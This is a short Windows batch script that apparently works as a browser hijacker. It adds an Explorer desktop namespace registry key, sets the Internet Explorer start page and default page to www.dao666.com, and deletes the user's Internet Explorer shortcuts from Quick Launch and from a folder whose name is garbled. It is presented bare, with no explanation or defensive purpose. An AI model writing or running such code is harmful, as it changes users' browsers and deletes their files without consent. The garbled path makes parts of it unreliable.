REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"

REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t REG_SZ /d "http://www.dao666.com/?cmd2" /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v  "Start Page"  /t REG_SZ /d "http://www.dao666.com/?cmd2" /f


del   "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explore*.*"



del       "%USERPROFILE%\����\*Explore*.*"







